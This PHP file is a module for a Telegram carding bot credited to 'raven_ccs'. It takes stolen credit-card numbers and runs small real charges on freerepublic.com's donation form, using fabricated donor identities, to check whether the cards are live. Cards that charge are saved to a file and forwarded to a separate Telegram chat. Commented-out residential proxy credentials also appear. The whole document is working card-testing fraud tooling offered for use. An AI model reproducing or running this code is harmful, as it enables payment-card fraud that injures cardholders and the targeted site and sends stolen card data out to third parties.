<?php

#----------------------------------------------------------------------#
#   GATE: UNKNOWN CCN CHARGE (AMOUNT = $5)                             #
#   SITE: hhttps://freerepublic.com/donate/                            #
#----------------------------------------------------------------------#
$gate = "CCN CHARGE ($5)";


if ((strpos($message, "/cnc") === 0) || (strpos($message, "!cnc") === 0)){

  if (in_array($userId, $premium_users) === false){
    sendMessage($chatId,$premium_unauth_msg, $message_id);
    return;
    }


error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";


//================ [ EXPLODE & LISTA ] ===============// 

$lista = substr($message, 4);
    $amount = multiexplode(array("*"), $lista)[1];
        preg_match_all('!\d+!', $amount, $amot);
        $amt = $amot[0][0];;
    if($amt > 50) { $amt = "50"; }
    if($amt < 3) { $amt = "3"; }

$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
 
 
$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }


if (strlen($ano) == 2) $ano = "20$ano";
if(strlen($mes) == 2){
if ($mes<10) $mes = substr($mes, 1, 1);
else $mes = $mes;
}

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";






//==================[BIN LOOK-UP]======================//
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
curl_close($ch);
$bank = urlencode(GetStr($fim, '"bank":{"name":"', '"'));
$brand = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$level = GetStr($fim, '"brand":"', '"');
$name = GetStr($fim, '"name":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
//$benk = ucwords("$bank");

$bindata1 = " $bin | $brand | $type | $level | .$bank | $name ($emoji) ";
$bininfo = "$brand | $type | $level";
$cuntry = "$name ($emoji)";
//$bank = ".$bank";



//=============== [ Random User Details ] ==============//
$get = file_get_contents('https://random-data-api.com/api/users/random_user');
preg_match_all("(\"first_name\":\"(.*)\")siU", $get, $matches1);
$name1 = $matches1[1][0];
preg_match_all("(\"last_name\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street_address\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"zip_code\":\"(.*)\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];

$serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$name.".".$last."1".rand(00,99)."@".$serv_rnd."";
//$username = "".$name."".$last."".rand(1000,9999)."";
$pass = "".$name."@".rand(1000,9999)."";
$phone = "917288".rand(1111,9999)."";
$date = ''.date("20y-m-d").'';
if(strlen($zip) > 5) $zip = substr($zip, 0, 5);

$rand = " $name - $last - $street - $city - $zip - $state - $email - $country - $date";


if($state=="Alabama"){ $stateid="AL";
}else if($state=="alaska"){ $stateid="AK";
}else if($state=="arizona"){ $stateid="AR";
}else if($state=="california"){ $stateid="CA";
}else if($state=="olorado"){ $stateid="CO";
}else if($state=="connecticut"){ $stateid="CT";
}else if($state=="delaware"){ $stateid="DE";
}else if($state=="district of columbia"){ $stateid="DC";
}else if($state=="florida"){ $stateid="FL";
}else if($state=="georgia"){ $stateid="GA";
}else if($state=="hawaii"){ $stateid="HI";
}else if($state=="idaho"){ $stateid="ID";
}else if($state=="illinois"){ $stateid="IL";
}else if($state=="indiana"){ $stateid="IN";
}else if($state=="iowa"){ $stateid="IA";
}else if($state=="kansas"){ $stateid="KS";
}else if($state=="kentucky"){ $stateid="KY";
}else if($state=="louisiana"){ $stateid="LA";
}else if($state=="maine"){ $stateid="ME";
}else if($state=="maryland"){ $stateid="MD";
}else if($state=="massachusetts"){ $stateid="MA";
}else if($state=="michigan"){ $stateid="MI";
}else if($state=="minnesota"){ $stateid="MN";
}else if($state=="mississippi"){ $stateid="MS";
}else if($state=="missouri"){ $stateid="MO";
}else if($state=="montana"){ $stateid="MT";
}else if($state=="nebraska"){ $stateid="NE";
}else if($state=="nevada"){ $stateid="NV";
}else if($state=="new hampshire"){ $stateid="NH";
}else if($state=="new jersey"){ $stateid="NJ";
}else if($state=="new mexico"){ $stateid="NM";
}else if($state=="new york"){ $stateid="NY";
}else if($state=="north carolina"){ $stateid="NC";
}else if($state=="north dakota"){ $stateid="ND";
}else if($state=="Ohio"){ $stateid="OH";
}else if($state=="oklahoma"){ $stateid="OK";
}else if($state=="oregon"){ $stateid="OR";
}else if($state=="pennsylvania"){ $stateid="PA";
}else if($state=="rhode Island"){ $stateid="RI";
}else if($state=="south carolina"){ $stateid="SC";
}else if($state=="south dakota"){ $stateid="SD";
}else if($state=="tennessee"){ $stateid="TN";
}else if($state=="texas"){ $stateid="TX";
}else if($state=="utah"){ $stateid="UT";
}else if($state=="vermont"){ $stateid="VT";
}else if($state=="virginia"){ $stateid="VA";
}else if($state=="washington"){ $stateid="WA";
}else if($state=="west virginia"){ $stateid="WV";
}else if($state=="wisconsin"){ $stateid="WI";
}else if($state=="wyoming"){ $stateid="WY";
}else{$stateid="KY";}





$ip = "Live! ✅";   
$gate = 'CCN CHARGE ($'.$amt.')';

//================= [ CURL REQUESTS ] =================//

#--------------------[1th REQ]--------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'resi.infiniteproxies.com:1111');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'infproxy_sorav7704:gCO27BE5scRjCrAy'); 
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://freerepublic.com/donate/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Host: freerepublic.com';
$headers[] = 'Origin: https://freerepublic.com';
$headers[] = 'Referer: https://freerepublic.com/donate/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=&amount.text='.$amt.'&frequency=one-time&method=cc&email='.urlencode($email).'&comments=');
$res1 = curl_exec($ch);
curl_close($ch);
$id = trim(strip_tags(getStr($res1,'Location: /donate/', '/')));

//sendMessage($chatId, ''.urlencode($id).'', $message_id);




#--------------------[2st REQ]--------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'resi.infiniteproxies.com:1111');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'infproxy_sorav7704:gCO27BE5scRjCrAy'); 
//curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://freerepublic.com/donate/'.$id.'/pay-by-card');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Host: freerepublic.com';
$headers[] = 'Origin: https://freerepublic.com';
$headers[] = 'Referer: https://freerepublic.com/donate/'.$id.'/pay-by-card';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'foreign=0&number='.$cc.'&month='.$mes.'&year='.$ano.'&first_name='.$name.'&last_name='.$last.'&address='.urlencode($street).'&city='.urlencode($city).'&state='.strtolower($stateid).'&zip='.$zip.'&email='.urlencode($email).'&phone=91244'.rand(11111,99999).'&country=usa');
$res2 = curl_exec($ch);

$msg = trim(strip_tags(getStr($res2,'type="hidden" name="foreign" value="0" />', '</div>')));




$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);

//if(strpos($res2,  'Thank you for your contribution')) { $msg = "Thank you for your contribution!"; }
//sendMessage($chatId, ''.urlencode($msg).'', $message_id);





//=================== [ RESPONSES ] ===================//

if((strpos($res2, 'You have pledged a one-time contribution of 5')) || (strpos($res2, 'Thank you for your contribution')) ){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CCN CHARGED $5</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>Thank you for your contribution.</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
  file_put_contents('Others/Save/ccn_charge.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
sendMsg('-4077073881', "$fmsg");
}

elseif ((strpos($res2, 'insufficient_funds')) || (strpos($res2, "Your card has insufficient funds."))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>NSF CCN</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
}

elseif ((strpos($res2, 'An error occurred during processing')) || (strpos($res2, 'The card was declined.'))){
sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.urlencode($msg).'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
}

else{
sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>ERROR! </b>❌ %0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
}




curl_close($ch);
unlink("cookies.txt");
}

//====================[Stripe Inline Charge]=====================//

?>